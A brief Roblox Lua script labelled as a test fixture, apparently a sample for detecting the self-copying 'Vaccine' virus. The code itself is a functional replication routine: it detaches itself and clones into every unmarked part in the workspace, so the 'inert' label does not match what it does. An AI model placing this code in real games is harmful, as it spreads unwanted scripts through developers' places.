-- TEST FIXTURE. Inert copy of the old self-copying "Vaccine" virus pattern.
script.Parent = nil
for _, v in workspace:GetDescendants() do
	if v:IsA("BasePart") and not v:FindFirstChild("Vaccine") then
		local c = script:Clone()
		c.Parent = v
	end
end
